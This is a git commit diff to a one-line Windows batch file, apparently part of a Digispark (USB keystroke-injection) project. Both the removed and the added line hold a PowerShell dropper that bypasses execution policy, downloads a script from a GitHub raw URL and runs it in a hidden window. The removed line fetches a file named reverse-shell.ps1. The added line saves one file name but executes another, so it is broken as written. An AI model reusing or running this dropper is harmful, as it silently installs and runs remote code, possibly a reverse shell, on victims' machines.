8de687923d7118bd0bdf02932c23083a26978606
Israel Hall Leighton <leightonisrael2014@gmail.com>
2024-07-04 14:58:50 -0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,2 +1,2 @@
 @echo off
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/leightonisrael/digispark-play/main/reverse-shell.ps1' -OutFile '%temp%\reverse_shell.ps1'; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File %temp%\reverse_shell.ps1' -WindowStyle Hidden"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/leightonisrael/digispark-play/main/helloBro.ps1' -OutFile '%temp%\reverse_shell.ps1'; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File %temp%\helloBro.ps1' -WindowStyle Hidden"
